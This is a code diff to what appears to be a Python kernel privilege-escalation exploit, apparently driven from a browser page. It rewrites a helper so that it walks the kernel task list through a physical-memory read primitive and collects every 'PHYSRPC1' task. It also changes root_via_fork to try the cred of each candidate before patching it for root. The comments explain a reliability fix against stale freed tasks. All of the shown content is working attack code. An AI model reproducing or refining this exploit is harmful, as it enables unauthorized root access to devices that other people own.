@@ -333,6 +333,40 @@ def _find_tag_near_tail(rpc, init_phys, init_virt, off, tag, hops=200):
     return None
 
 
+def _find_tags_near_tail(rpc, init_phys, init_virt, off, tag, hops=400):
+    """Every task whose comm starts with `tag`, walking init.tasks.prev.
+
+    Collecting ALL of them matters on this kernel: a freed PHYSRPC1 task from an
+    earlier page load can sit closer to the tail than the live one.  The old
+    single-hit lookup then returned the dead task, its cred pointer failed the
+    sanity check, and root_via_fork retried six times against the same corpse
+    ("skip 0xe234cf00 (not a cred)") while the live thread was one hop further.
+    """
+    found = []
+    head = (init_virt + off) & 0xFFFFFFFF
+    seen = set()
+    try:
+        cur = rpc.read_u32(init_phys + off + 4)
+    except Exception:
+        return found
+    for _ in range(hops):
+        if not T._kernel_ptr(cur) or cur == head or cur in seen:
+            break
+        seen.add(cur)
+        task = (cur - off) & 0xFFFFFFFF
+        try:
+            comm = _comm_at(rpc, task)
+        except Exception:
+            break
+        if comm.startswith(tag):
+            found.append(task)
+        try:
+            cur = rpc.read_u32(PHYS(cur) + 4)
+        except Exception:
+            break
+    return found
+
+
 def _sane_cred(rpc, cred):
     """A real cred lives in the kernel direct map and has a small refcount and
     small uid/gid values.  Anything else (vmalloc pointer, ASCII data, stale
@@ -395,12 +429,14 @@ def root_via_fork(rpc, do_exec=False):
 
         # Primary: find our own PHYSRPC1 thread by walking the tail; its cred
         # is the one getuid() reads, and it is validated before patching.
+        # Try EVERY tag, not just the first: freed threads from an earlier page
+        # load can be nearer the tail, and their cred pointer is garbage.
         targets = []
-        self_task = _find_tag_near_tail(rpc, init_phys, init_virt, 0x23C,
-                                        b"PHYSRPC1", 200)
-        if self_task is not None:
-            print(f"[+] PHYSRPC1 task at {T.hexs(self_task)}", flush=True)
-            targets.append(self_task)
+        for t in _find_tags_near_tail(rpc, init_phys, init_virt, 0x23C,
+                                      b"PHYSRPC1", 400):
+            if t not in targets:
+                print(f"[+] PHYSRPC1 task at {T.hexs(t)}", flush=True)
+                targets.append(t)
 
         # Fallback: parent pointers inside the child's task_struct.
         if not targets:
